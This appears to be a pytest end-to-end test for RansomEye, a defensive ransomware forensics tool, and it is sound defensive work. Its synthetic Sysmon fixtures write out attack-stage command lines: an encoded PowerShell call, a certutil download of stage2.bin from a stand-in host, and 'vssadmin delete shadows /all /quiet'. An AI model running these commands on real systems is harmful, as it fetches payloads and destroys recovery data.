"""End-to-end defensive product validation test workflow for RansomEye.

Validates the complete pipeline:
Safe Test Data -> Evidence Collection -> Normalization -> EvidenceStore ->
Detection -> Findings -> Correlation -> Threat Assessment ->
Investigation Graph -> Timeline -> Process Tree -> Attack Reconstruction ->
Investigation Integrity Validation -> Forensic Case Report.
"""

import json
from pathlib import Path

from ransomeye.commands import ingest_evidence, run_static_analysis_command
from ransomeye.investigation import load_investigation, get_investigation_summary
from ransomeye.investigation_graph import build_investigation_graph
from ransomeye.investigation_validation import validate_investigation
from ransomeye.reconstruction import reconstruct_attack
from ransomeye.report import generate_case_report
from ransomeye.storage import EvidenceStore
from ransomeye.timeline import build_process_tree, get_case_timeline


def test_full_defensive_ransomware_investigation_lifecycle(tmp_path: Path):
    db_path = tmp_path / "ransomeye_e2e_validation.db"
    case_id = "CASE-VALIDATE-2026"

    # Step 1: Prepare Safe Synthetic Ingestion Data
    safe_events = [
        # Stage 1: Initial Access / Execution (PowerShell with encoded command)
        {
            "event_id": "EVT-E2E-001",
            "timestamp": "2026-10-04T08:00:00Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "powershell.exe",
            "pid": "1001",
            "parent_pid": "500",
            "process_guid": "{GUID-POWERSHELL-01}",
            "parent_process_guid": "{GUID-EXPLORER-00}",
            "command_line": "powershell.exe -NoProfile -enc SQBFAFgA",
            "file_path": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        },
        # Stage 2: Defense Evasion / Payload Retrieval (CertUtil download)
        {
            "event_id": "EVT-E2E-002",
            "timestamp": "2026-10-04T08:00:05Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "certutil.exe",
            "pid": "1002",
            "parent_pid": "1001",
            "process_guid": "{GUID-CERTUTIL-02}",
            "parent_process_guid": "{GUID-POWERSHELL-01}",
            "command_line": "certutil.exe -urlcache -split -f https://example.invalid/stage2.bin",
            "file_path": r"C:\Windows\System32\certutil.exe",
        },
        # Stage 3: Inhibit System Recovery (vssadmin delete shadows)
        {
            "event_id": "EVT-E2E-003",
            "timestamp": "2026-10-04T08:00:10Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "vssadmin.exe",
            "pid": "1003",
            "parent_pid": "1001",
            "process_guid": "{GUID-VSSADMIN-03}",
            "parent_process_guid": "{GUID-POWERSHELL-01}",
            "command_line": "vssadmin delete shadows /all /quiet",
            "file_path": r"C:\Windows\System32\vssadmin.exe",
        },
        # Stage 4: Ransom Note Creation
        {
            "event_id": "EVT-E2E-004",
            "timestamp": "2026-10-04T08:00:15Z",
            "source": "live_file",
            "event_type": "file_create",
            "file_path": r"C:\Users\Target\Desktop\HOW_TO_DECRYPT_FILES.txt",
            "pid": "1001",
            "process_guid": "{GUID-POWERSHELL-01}",
        },
        # Stage 5: Network C2 Check-in
        {
            "event_id": "EVT-E2E-005",
            "timestamp": "2026-10-04T08:00:20Z",
            "source": "sysmon",
            "event_type": "network_connect",
            "process_name": "powershell.exe",
            "pid": "1001",
            "process_guid": "{GUID-POWERSHELL-01}",
            "network": {
                "destination_ip": "198.51.100.99",
                "destination_port": 443,
                "protocol": "tcp",
            },
        },
    ]

    evidence_file = tmp_path / "safe_attack_evidence.json"
    evidence_file.write_text(json.dumps(safe_events), encoding="utf-8")

    # Step 2: Evidence Collection & Ingestion Pipeline
    ingest_result = ingest_evidence(
        database_path=db_path,
        case_id=case_id,
        file_path=evidence_file,
        format_type="json",
        case_name="End-to-End Validation Case",
        host="SEC-ENDPOINT-01",
    )

    assert ingest_result["events_accepted"] == 5
    assert ingest_result["findings_count"] >= 3
    assert ingest_result["score"] > 24
    assert ingest_result["severity"] in ("MEDIUM", "HIGH", "CRITICAL")

    # Step 3: Dropped Binary Static File Analysis & Ingestion
    payload_artifact = tmp_path / "stage2.bin"
    payload_artifact.write_bytes(
        b"MZ\x00\x00\x90\x00\x03\x00"
        + b"\x00" * 56
        + b"\x80\x00\x00\x00"
        + b"\x00" * 64
        + b"PE\x00\x00"
        + b"HOW_TO_DECRYPT_FILES and contact https://ransom-c2.example.org"
    )
    static_ret = run_static_analysis_command(
        file_path=payload_artifact,
        database_path=db_path,
        case_id=case_id,
    )
    assert static_ret == 0

    # Step 4: Storage Verification & Chain of Custody Recording
    store = EvidenceStore(db_path)
    try:
        case = store.get_case(case_id)
        assert case["status"] == "OPEN"
        assert case["host"] == "SEC-ENDPOINT-01"

        store.record_custody_event(
            case_id=case_id,
            artifact_path=str(evidence_file),
            sha256="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
            action="created",
            analyst="analyst@ransomeye.local",
            note="Initial ingestion of recorded Sysmon evidence",
        )
        custody_events = store.get_custody_events(case_id)
        assert len(custody_events) >= 2
        actions = [e["action"] for e in custody_events]
        assert "created" in actions
        assert "reviewed" in actions
    finally:
        store.close()

    # Step 5: Investigation Domain Model & Graph Assembly
    investigation = load_investigation(db_path, case_id)
    summary_text = get_investigation_summary(investigation)
    assert "Case:" in summary_text
    assert "Threat Score:" in summary_text

    graph = build_investigation_graph(investigation)
    assert len(graph.get_process_nodes()) >= 3
    assert len(graph.get_finding_nodes()) >= 3

    # Step 6: Process Tree & Timeline Construction
    timeline_events = get_case_timeline(db_path, case_id)
    assert len(timeline_events) == 6
    process_tree = build_process_tree(timeline_events)
    assert "nodes" in process_tree

    # Step 7: Attack Reconstruction & Multi-Stage Kill-Chain Synthesis
    attack_sequence = reconstruct_attack(investigation, graph)
    assert len(attack_sequence.stages) >= 2

    # Step 8: Complete Forensic Investigation Validation
    val_result = validate_investigation(db_path, case_id)
    assert val_result.case_exists is True
    assert val_result.assessment_available is True
    assert val_result.findings_count >= 3
    assert val_result.evidence_count >= 5
    assert val_result.passed is True

    # Step 9: Final Deterministic Forensic Case Report Generation
    report_text = generate_case_report(db_path, case_id)
    assert "CASE-VALIDATE-2026" in report_text
    assert "SEC-ENDPOINT-01" in report_text
    assert "FINDINGS" in report_text
    assert "CHAIN OF CUSTODY" in report_text
    assert "powershell.exe" in report_text
    assert "certutil.exe" in report_text
    assert "vssadmin.exe" in report_text
